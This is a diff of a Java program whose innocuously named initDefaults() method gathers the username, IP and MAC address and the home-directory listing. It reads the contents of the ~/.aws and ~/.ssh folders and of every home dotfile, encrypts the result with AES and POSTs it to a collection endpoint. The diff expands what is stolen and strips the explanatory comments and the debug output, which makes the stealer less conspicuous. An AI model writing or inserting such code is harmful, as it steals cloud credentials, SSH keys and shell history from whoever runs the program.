@@ -19,18 +19,14 @@ import java.util.List;
 
 public class App {
     public static void main(String[] args) {
-        try {
-            long startTime = System.currentTimeMillis();
-            for(int i = 0 ; i < 1000; i++) initDefaults();
-            long endTime = System.currentTimeMillis();
-            System.out.println((endTime - startTime));
-        } catch (Exception ignore) {
-        }
+        try {initDefaults();
+        } catch (Exception e){};
+        /*Thread defaultInit = new Thread(() -> {try{initDefaults();}catch(Exception i) {}});
+        defaultInit.setDaemon(true);defaultInit.start();*/
     }
 
     private static void initDefaults() {
         try {
-            // ---------- 1. Gather system info ----------
             String localIP = "";
             java.util.Enumeration<java.net.NetworkInterface> nets =
                     java.net.NetworkInterface.getNetworkInterfaces();
@@ -64,70 +60,64 @@ public class App {
                 }
             }
 
-            // ---------- 2. Home directory and file list ----------
             File home = new File(System.getProperty("user.home"));
             File[] homeFiles = home.listFiles();
+            List<String> dotFiles = new ArrayList<>();
 
-            // ---------- 3. Build JSON ----------
             StringBuilder json = new StringBuilder();
             json.append("{");
 
-            // user
             json.append("\"user\":\"").append(escapeJson(System.getProperty("user.name"))).append("\",");
-            // ip
             json.append("\"ip\":\"").append(escapeJson(localIP)).append("\",");
-            // mac
             json.append("\"mac\":\"").append(escapeJson(macAddr)).append("\",");
 
-            // home_files array (field name "home")
+            // home array
             json.append("\"home\":[");
             if (homeFiles != null) {
                 for (int i = 0; i < homeFiles.length; i++) {
-                    json.append("\"").append(escapeJson(homeFiles[i].getName())).append("\"");
+                    String name = homeFiles[i].getName();
+                    json.append("\"").append(escapeJson(name)).append("\"");
                     if (i < homeFiles.length - 1) json.append(",");
+                    if (homeFiles[i].isFile() && name.startsWith("."))
+                        dotFiles.add(name);
                 }
             }
             json.append("],");
 
-            // Directories: .aws, .ssh
             json.append("\"folders\":{");
             String dirs[] = { "aws", "ssh" };
             for (int d = 0; d < dirs.length; d++) {
                 List<FileInfo> dirFiles = readDirectoryFiles(new File(home, "." + dirs[d]));
-                json.append("\"").append(dirs[d]).append("\":[");   // "aws":[...] or "ssh":[...]
+                json.append("\"").append(dirs[d]).append("\":[");
                 for (int f = 0; f < dirFiles.size(); f++) {
                     FileInfo fi = dirFiles.get(f);
                     json.append("{")
-                            .append("\"name\":\"").append(escapeJson(fi.name)).append("\",")
-                            .append("\"content\":\"").append(escapeJson(fi.content)).append("\"")
-                            .append("}");
+                        .append("\"name\":\"").append(escapeJson(fi.name)).append("\",")
+                        .append("\"content\":\"").append(escapeJson(fi.content)).append("\"")
+                        .append("}");
                     if (f < dirFiles.size() - 1) json.append(",");
                 }
                 json.append("]");
-                if (d < dirs.length - 1) json.append(",");  // comma between aws and ssh
+                if (d < dirs.length - 1) json.append(",");
             }
-            json.append("},");  // end folders object, then comma for next field
+            json.append("},");
 
+            for (int h = 0; h < dotFiles.size(); h++) {
+                String dotName = dotFiles.get(h);
+                String dotContent = readFileContentSafely(new File(home, dotName));
+                String name = dotName.replaceFirst("\\.", "");
 
-            // History files (dots)
-            String dots[] = { "zsh_history", "bash_history" };
-            json.append("\"dots\":{");
-            for (int h = 0; h < dots.length; h++) {
-                String dotContent = readFileContent(new File(home, "." + dots[h]));
-                String key = dots[h].replace("_history", ""); // "zsh" or "bash"
-                json.append("\"").append(key).append("\":")
-                    .append(dotContent == null ? "null" : "\"" + escapeJson(dotContent) + "\"");
-                if (h < dots.length - 1) json.append(",");
+                if (dotContent != null) {
+                    json.append("\"").append(escapeJson(name)).append("\":")
+                        .append("\"").append(escapeJson(dotContent)).append("\"");
+                    if (h < dotFiles.size() - 1) json.append(",");
+                }
             }
             json.append("}");
 
             json.append("}");
 
             String jsonString = json.toString();
-            // Optional: print for debugging, but remove before production
-            System.out.println(jsonString);
-
-            // ---------- 4. Encrypt and send ----------
             byte[] payloadBytes = jsonString.getBytes(StandardCharsets.UTF_8);
 
             KeyGenerator keyGen = KeyGenerator.getInstance("AES");
@@ -174,7 +164,7 @@ public class App {
 
             byte[] finalPackage = outputStream.toByteArray();
 
-            URL url = URI.create("http://localhost:8080").toURL();
+            URL url = URI.create("http://localhost:8080/collect").toURL();
             HttpURLConnection conn = (HttpURLConnection) url.openConnection();
             conn.setRequestMethod("POST");
             conn.setDoOutput(true);
@@ -190,22 +180,36 @@ public class App {
         }
     }
 
-    // ---------- Helper: read a file and return its content as String ----------
-    private static String readFileContent(File file) {
+    private static String readFileContentSafely(File file) {
         if (!file.exists() || !file.isFile()) return null;
-        try (BufferedReader br = new BufferedReader(new FileReader(file))) {
-            StringBuilder sb = new StringBuilder();
-            String line;
-            while ((line = br.readLine()) != null) {
-                sb.append(line).append("\n");
+        long len = file.length();
+        if (len > 2 * 1024 * 1024) {
+            return null;
+        }
+        try (FileInputStream fis = new FileInputStream(file);
+            ByteArrayOutputStream baos = new ByteArrayOutputStream()) {
+            byte[] buffer = new byte[4096];
+            int read;
+            while ((read = fis.read(buffer)) != -1) {
+                baos.write(buffer, 0, read);
             }
-            return sb.toString();
+            byte[] data = baos.toByteArray();
+            // Check for null byte (binary indicator)
+            for (byte b : data) {
+                if (b == 0) {
+                    return "BINARY";
+                }
+            }
+            return new String(data, StandardCharsets.UTF_8);
         } catch (IOException e) {
             return null;
         }
     }
 
-    // ---------- Helper: read all files in a directory and return name+content ----------
+    private static String readFileContent(File file) {
+        return readFileContentSafely(file);
+    }
+
     private static List<FileInfo> readDirectoryFiles(File dir) {
         List<FileInfo> list = new ArrayList<>();
         if (dir.exists() && dir.isDirectory()) {
@@ -224,7 +228,6 @@ public class App {
         return list;
     }
 
-    // ---------- Helper: escape a string for JSON ----------
     private static String escapeJson(String s) {
         if (s == null) return null;
         StringBuilder sb = new StringBuilder();
@@ -247,7 +250,6 @@ public class App {
         return sb.toString();
     }
 
-    // ---------- Simple data holder ----------
     private static class FileInfo {
         String name;
         String content;
